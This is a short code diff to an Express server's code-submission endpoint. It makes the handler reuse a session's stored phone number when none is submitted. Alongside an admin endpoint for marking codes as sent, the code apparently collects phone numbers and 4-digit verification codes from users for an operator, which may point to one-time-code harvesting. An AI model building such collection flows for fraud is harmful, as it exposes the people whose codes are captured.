@@ -96,12 +96,16 @@ app.post('/api/admin/mark-code-sended', (req, res) => {
 
 app.post('/api/submit-code', (req, res) => {
   const { sessionId, phone, code, attempt } = req.body;
-  const cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
+  let cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
   const cleanCode = String(code || '').replace(/\D/g, '').slice(0, 4);
 
   if (sessionId && sessions.has(sessionId)) {
     const entry = sessions.get(sessionId);
-    if (cleanPhone) entry.phone = cleanPhone;
+    if (cleanPhone) {
+      entry.phone = cleanPhone;
+    } else if (entry.phone) {
+      cleanPhone = entry.phone;
+    }
     entry.updatedAt = Date.now();
   }
 
